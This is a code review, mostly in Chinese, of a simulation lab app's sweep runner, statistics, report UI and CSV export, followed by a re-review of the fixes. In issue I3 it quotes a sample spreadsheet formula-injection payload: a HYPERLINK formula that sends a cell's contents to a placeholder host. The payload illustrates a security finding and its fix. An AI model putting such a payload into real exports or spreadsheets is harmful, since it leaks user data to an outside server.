# Task 9 Review — Sweep / Report / CSV

## Spec Compliance

本审查以 `briefs/task-9.md` 为意图源，以 `diffs/task-9.diff` 的 current snapshots 为实现证据；`reports/task-9.md` 中的测试通过与行为声明不作为独立证据。本次未修改实现、Git index 或 HEAD。

| 规格面 | 结论 | 实现证据 / 说明 |
|---|---|---|
| 固定 30 → 60 → 90 顺序与命令切换 | 符合 | `src/features/sweep/sweepRunner.ts:3-6,114-140` 固定唯一序列，并在完成当前工况后才返回下一功率命令。 |
| 前工况尾帧隔离 | 符合 | `src/features/sweep/sweepRunner.ts:46-48` 对功率不等的帧原样返回，计时、采样、命令均不推进。 |
| 连续稳定 2 s、采样 4 s、采样前 15 s 超时 | 正常有限 dt 下符合 | `src/features/sweep/sweepRunner.ts:53-89`；transient 清零稳定时间，达到 2,000 ms 后从下一帧开始采样，80 × 50 ms 得到 4,000 ms；超时只在进入 sampling 前检查。非有限 dt 的缺口见 I4。 |
| retry / cancel / restart / reset | 基本符合 | `retryFailedCondition` 只清当前功率数组并保留先前数组引用（`sweepRunner.ts:101-111`）；cancel 保留 sweep 快照，restart 新建 sweep，reset 清 sweep/history（`labStore.ts:77-112`）。store 锁边界见 I2。 |
| 纯仿真 dt、无 wall-clock 推进 | 符合（正常输入） | runner 仅消费显式 `dtMs`；store 从相邻 `simulationTimeMs` 求差（`labStore.ts:62-63`）。生成时间只用于导出元数据/文件名。 |
| stable-only 统计、population std、min/max、count/time、valid ≥ 20 | 公式符合；输入质量不完整 | `experimentSummary.ts:32-64` 使用稳定样本、总体方差除以 `N`，输出四指标 avg/std/min/max、稳定样本数和最早/最晚时间；非有限值仍会被计为 valid，见 I5。 |
| v² 残差与 largest evidence | 部分不符合 | 残差公式本身为基线载荷 × `(v/v0)²` 的绝对残差（`ExperimentReport.tsx:210-225`），但没有要求三个摘要全部有效便解锁 evidence，见 I1。 |
| 至少 12 字符结论 | 符合 | UI 与教程 evidence 都按 `trim().length >= 12` 判定（`ExperimentReport.tsx:145-146`；`tutorialProgress.ts:80-82`）。 |
| UI / store 扫频锁定与取消后解锁 | UI 符合，store 不符合 | slider/start/pause 在 active sweep 时禁用；但公开 store actions 可绕过，见 I2。 |
| CSV BOM / CRLF / RFC4180 / metadata / units / raw / summary / disclaimer / filename | 格式符合；安全缺口 | `csv.ts:47-101` 输出 BOM、全 CRLF、元数据、units、原始十列、30/60/90 汇总；`csv.ts:104-116` 文件名符合约定。公式注入见 I3。 |
| 导出失败快照与 URL 回收 | 主路径符合，边缘异常不完整 | 下载抛错后保存 `{csv, generatedTime}`，重试不再读取 store（`ExperimentReport.tsx:144-165,184-186`）；URL 在 click 的 finally 回收，但 setup 异常会漏回收，见 M1；serialization 不在失败捕获内，见 M2。 |
| App wiring 不重复推进 / 不泄漏 | 符合 | `App.tsx:38-65` 只创建一个 runtime 与一个 store subscription，并在 effect cleanup 中同时注销；sweep 只在 store 的 `acceptFrame` 路径推进，没有第二个 UI 推进器。 |

## Strengths

- 状态机对错误功率帧直接返回同一 state 引用，真正隔离了上一工况尾帧，且不会误加 timeout/stable/sampling 时间。
- 2 s 稳定判据是连续窗口；进入 sampling 的阈值帧不被重复计入采样，正常 50 ms 步进下没有 dt 双算。
- retry 使用浅复制 map、仅替换失败功率数组；已完成工况数组引用保持不变，满足“只重启失败工况”。
- 汇总采用总体标准差而非样本标准差，空集合返回 nullable 指标，避免 `Math.min(...[])` 的 Infinity 主路径。
- CSV 的 BOM、CRLF、字段内换行归一化、双引号翻倍和带分隔符字段加引号均正确；raw 与 summary 均保留单位语义和模拟/教学免责声明。
- 失败下载保留的是不可变 CSV 字符串，而不是稍后会变化的 store 数组；重试的时间戳与文件内容保持一致。
- App effect 的 runtime、订阅和 cleanup 成对，未发现重复 `advanceSweep`、重复 interval 或卸载后订阅泄漏。

## Issues

### Critical

无。

### Important

#### I1. 三个摘要未全部有效时，残差单选和 largest evidence 已可解锁

- **Finding:** `src/features/report/ExperimentReport.tsx:221-231` 逐工况独立计算 residual，并让 `findLargestResidualPower` 接受任意非 `null` residual；`src/features/report/ExperimentReport.tsx:121-126` 只要这个结果非空就启用三行全部 radio。
- **Intent:** Brief 要求 largest-residual evidence 只能来自有效比较；实施报告进一步明确“只有三个摘要有效时才允许选择”。
- **Reality / impact:** 仅 30% 工况拥有 20 个稳定样本时，30% 对自身的 residual 已是 0，`largestResidualPower` 会变成 30；此时所有 radio 都启用，选择 30% 会经 App 写成 `selectedLargestResidual: true`，在 60%/90% 尚无有效数据、甚至 sweep 尚未完成时提前完成 compare evidence。无效行也被启用。
- **Fix:** 在建立 residual 或 largest 之前先要求 `sweep.status === "completed" && conditions.every(c => c.summary.valid)`，否则所有 residual/largest 均为 `null`；每行还应按自身有效性禁用。新增“仅 30 有效”“30/60 有效”“三者均有效”三组测试。

#### I2. 自动扫频锁只存在于 UI；公开 store actions 可暂停、跳相位或覆盖 active sweep

- **Finding:** `src/features/experiment/labStore.ts:73-76` 的 `startRun/pauseRun/resumeRun/advancePhase` 无 sweep ownership guard，`src/features/experiment/labStore.ts:91-96` 的 `startSweep` 也可在 active sweep 中直接重建状态；只有 `setFanPower` 在 `labStore.ts:55-57` 做了 store 级保护。
- **Intent:** 固定扫频拥有功率/时序控制权，自动扫频期间手动控制必须锁定，并在 cancel/restart/reset 后按定义解锁。
- **Reality / impact:** 任意 store 调用者可在 sweep active 时执行 `pauseRun()`，令 runtime 停止产帧而 sweep 仍处于 active，15 s 仿真 timeout 永远不会到达；也可 `advancePhase()` 使运行相位与 sweep 状态脱节，或 `startSweep()` 静默丢掉已采样数组。当前 UI 测试只能证明按钮禁用，不能证明 store 不变量。
- **Fix:** 在所有手动 run-phase actions 与 active `startSweep` 入口加入统一 ownership guard；仅允许明确的 `cancelSweep`/`resetLab` 中断，失败/完成/idle 后再开放合法 restart。增加直接调用 store actions 的锁定与解锁测试。

#### I3. 用户结论可触发 spreadsheet formula injection

- **Finding:** `src/features/report/csv.ts:119-121` 只实现 RFC4180 quoting；以 `=`, `+`, `-`, `@`（以及这些符号前的空白/tab）开头的字符串仍原样进入 CSV。`conclusion` 是用户可编辑文本（`ExperimentReport.tsx:172-178`）。
- **Intent:** CSV 面向 spreadsheet 打开，用户明确要求核查结论的公式注入风险。RFC4180 引号并不会阻止 Excel/LibreOffice 将单元格解释为公式。
- **Reality / impact:** 例如结论 `=HYPERLINK("https://example.invalid/?x="&A1,"结论")` 会被正确加引号但仍可能作为公式执行；可造成外链请求、数据外带或误导性内容。可选 title/disclaimer 等 string metadata 也有同类风险。
- **Fix:** 在 RFC4180 escaping 前，仅对 **string** 类型、去除前导空白后首字符为 `=+-@` 的 cell 采用 spreadsheet-safe 前缀（常见为 `'`），不要破坏合法负数 number。添加四个前缀、前导空白/tab、正常中文和负数 number 的测试。

#### I4. `NaN`/`Infinity` dt 会破坏 2 s/4 s/15 s 的确定性与活性

- **Finding:** `src/features/sweep/sweepRunner.ts:50-51` 使用 `Math.max(0, dtMs)`；对 `NaN` 结果仍为 `NaN`，对 `Infinity` 仍为 `Infinity`。store 的差值来源 `src/features/experiment/labStore.ts:62` 也没有 finite 校验。
- **Intent:** runner 应由 deterministic simulation `dtMs` 推进，并可靠执行稳定、采样和超时边界。
- **Reality / impact:** 一次 `NaN` 会把 `stableMs/conditionElapsedMs` 永久污染为 `NaN`，之后既不会稳定也不会在 15 s 失败；`Infinity` 可用一个稳定帧进入 sampling，再用一个帧完成 4 s，产生单样本工况。负数已钳制，但非有限数没有。
- **Fix:** 在 reducer 边界明确拒绝或归零非有限 dt（更推荐返回 failed/typed error，避免静默卡死），store 也应只从有限且单调的 simulation timestamps 生成 dt。新增 NaN、±Infinity、回退 timestamp 测试。

#### I5. 含非有限指标/时间的 20 个 stable 样本仍被标为 valid

- **Finding:** `src/features/report/experimentSummary.ts:33-43` 的 valid 只看 stable 数量；`src/features/report/experimentSummary.ts:55-63` 直接对值做 reduce/Math.min/Math.max，无 `Number.isFinite` 验证。
- **Intent:** valid 摘要要能支撑 v² 比较、largest evidence 和 CSV 教学结论，而不是仅满足行数。
- **Reality / impact:** 20 个 `quality: "stable"` 样本只要任一度量或时间为 `NaN/Infinity`，摘要仍为 `valid: true`，UI/CSV 输出 `NaN`/`Infinity`；NaN residual 也被 `residual !== null` 当作 available，进一步污染 largest 判定。
- **Fix:** 对参与统计的五个 number 字段做 finite 校验；要么丢弃整条不完整样本并以有效稳定样本数判定 ≥20，要么保留原 count 但令 `valid: false` 并报告 invalid count。残差层也必须只接受 finite means/residuals。增加 NaN/Infinity 与部分字段异常测试。

### Minor

#### M1. Object URL 的 `finally` 没覆盖 URL 创建后的全部操作

- **Finding:** `src/features/report/csv.ts:107-115` 在创建 object URL 后，先执行 `document.createElement`、`anchor.href = ...`、`anchor.download = ...`，到 `anchor.click()` 才进入 `try/finally`。
- **Impact:** 若 anchor 创建或属性设置抛错，已创建的 URL 不会 revoke；“revoke always”只对 click 成功/失败成立。
- **Fix:** 在 `createObjectURL` 之后立即进入 `try`，把 anchor 创建、配置和 click 全部包住，finally 中 revoke。新增 setup 抛错和 click 抛错测试。

#### M2. 序列化失败不进入统一导出失败 UI

- **Finding:** `src/features/report/ExperimentReport.tsx:157-165` 在 `runDownload` 的 try/catch 外调用 `serializeExperimentCsv`；只有 download helper 异常会设置 `failedSnapshot`。
- **Impact:** 若序列化因异常输入或资源错误抛错，事件直接冒泡，用户看不到“导出失败，实验数据仍保留”，也没有可重试路径。store 数据本身未被清空，但失败契约不完整。
- **Fix:** 将 snapshot 组装/序列化与 download 纳入统一错误状态；只有 CSV 成功生成后才保存 immutable retry snapshot，序列化失败则显示相同保留数据提示并允许重新序列化当前明确快照，或区分两类错误状态。

## Assessment

**结论：Needs changes。** 正常 50 ms 仿真输入下，固定顺序、尾帧隔离、2 s 连续稳定、4 s 采样、15 s 采样前超时、retry 引用保留、统计公式、CSV 主格式和 App cleanup 均实现扎实，没有发现 Critical。合入前应至少修复 I1（evidence 可提前完成）、I2（store 锁可绕过）、I3（CSV 公式注入）以及 I4/I5（非有限数破坏时序和统计有效性）；M1/M2 是导出失败与资源清理契约的边缘缺口。

---

## Fix Round 1 Review

复审范围严格限定为原 I1–I5、M1–M2；以下结论来自 `diffs/task-9-fix-1.diff` 的实现与对应回归测试快照。报告末尾的 GREEN/全套测试声明仅作为导航，不作为独立通过证据。

### Original Findings

#### I1 — ADDRESSED

- `src/features/report/ExperimentReport.tsx:234-249` 先要求 `sweep.status === "completed"` 且 30/60/90 三个 summary 全部 valid；否则三行 residual 全部为 `null`。
- `src/features/report/ExperimentReport.tsx:251-261` 进一步要求每个 mean 与最终 residual 均 finite，并采用 all-or-none gate；`src/features/report/ExperimentReport.tsx:121-126` 因 largest 为 `null` 而禁用全部 radio，不能提前写入 evidence。
- `src/features/report/ExperimentReport.test.tsx:207-253` 覆盖仅 30 有效、仅 30/60 有效、三者有效但未 completed，以及 residual 溢出四类原失败路径。

#### I2 — ADDRESSED

- `src/features/experiment/labStore.ts:86-89` 对 `startRun/pauseRun/resumeRun/advancePhase` 使用统一 active-sweep ownership guard；`src/features/experiment/labStore.ts:104-109` 同样阻止 active 状态下重复 `startSweep`，并返回原 state reference。
- `src/features/experiment/labStore.ts:90-124` 保留 reset/cancel/retry 的明确中断与恢复入口；idle/failed/completed 不属于 active，允许合法 restart。
- `src/features/experiment/labStore.test.ts:62-100` 直接验证五个 store action 均不能绕过锁，以及 cancel/reset 后解锁。

#### I3 — ADDRESSED

- `src/features/report/csv.ts:119-122` 只对 string cell 检查忽略前导 whitespace 后的 `=`, `+`, `-`, `@`，在原字符串最前加 apostrophe，再执行既有 RFC4180 escaping。
- number 类型不经过该保护，合法负数仍保持数值语义；`src/features/report/csv.test.ts:54-90` 覆盖四个危险前缀、空格/tab 前缀、正常中文与负数 number。

#### I4 — ADDRESSED

- `src/features/sweep/sweepRunner.ts:51-59,112-114` 对 `NaN`、`±Infinity`、负数和单步大于 1,000 ms 的 dt 进入 retryable failed，且不改变原有 finite timers；错误功率帧仍在 dt 校验前隔离（`sweepRunner.ts:47-49`）。
- `src/features/experiment/labStore.ts:67-75` 对正确功率的非法 timestamp/dt 不接纳 telemetry/history，只提交 failed sweep；非法时间的错误功率尾帧返回完整原 state。`labStore.ts:116-124` 可从该 failed 状态重试。
- `src/features/sweep/sweepRunner.test.ts:107-122` 与 `src/features/experiment/labStore.test.ts:102-145` 覆盖非有限、回退、超大步长、重试后恢复及尾帧隔离。

#### I5 — ADDRESSED

- `src/features/report/experimentSummary.ts:32-43,55-71` 只有 quality stable 且时间/RPM/风速/压力/载荷五字段全部 finite 的 frame 才计入统计；valid 使用过滤后的 count ≥20，并额外要求四组统计结果 finite。
- `src/features/report/ExperimentReport.tsx:244-261` 对 baseline means、各工况 means、计算后的 residual 再做 finite gate；任一失败时整组 residual 清为 `null`，largest/evidence 不可用。
- `src/features/report/experimentSummary.test.ts:43-75` 覆盖五字段分别异常与全异常集合；`ExperimentReport.test.tsx:232-253` 覆盖有限输入导致 residual 溢出的路径。

#### M1 — ADDRESSED

- `src/features/report/csv.ts:107-115` 在 object URL 创建成功后立即进入 `try/finally`，anchor 创建、属性设置和 click 全部被覆盖，所有这些路径都会 revoke。
- `src/features/report/csv.test.ts:92-116` 分别验证 setup throw 与 click throw 后的 URL 回收。

#### M2 — ADDRESSED

- `src/features/report/ExperimentReport.tsx:154-170` 将 serialization 与 download 都路由到同一 `failedSnapshot`/错误 UI；serialization 失败保留 input snapshot，download 失败保留已经生成的 CSV。
- `src/features/report/ExperimentReport.tsx:173-183` 在首次导出时复制每个 `TelemetryFrame` 并新建 metadata/input，后续 retry 不再读取变化后的 sweep、结论或 generated time；当前 `TelemetryFrame` 字段均为 primitive，逐 frame 浅复制足以隔离 store 数据。
- `src/features/report/ExperimentReport.test.tsx:104-185` 分别验证 download failure 重用同一 CSV，以及 serializer failure 使用同一 240-frame input snapshot 后再下载。

### New Breakage

未在本轮限定的七个修复边界内发现新破坏。

### Out-of-Scope

- 未重新审查 Task 9 的其他时序、统计公式、教程流程、样式、App/runtime 接线或既有行为。
- 未修改实现、测试、Git index 或 HEAD；未执行报告声称的全量测试、lint 或 build，因而不独立背书这些运行结果。

### Verdict

**PASS — 7/7 original findings ADDRESSED。** Fix round 1 已关闭 I1、I2、I3、I4、I5、M1、M2；在本轮限定范围内无阻塞项。
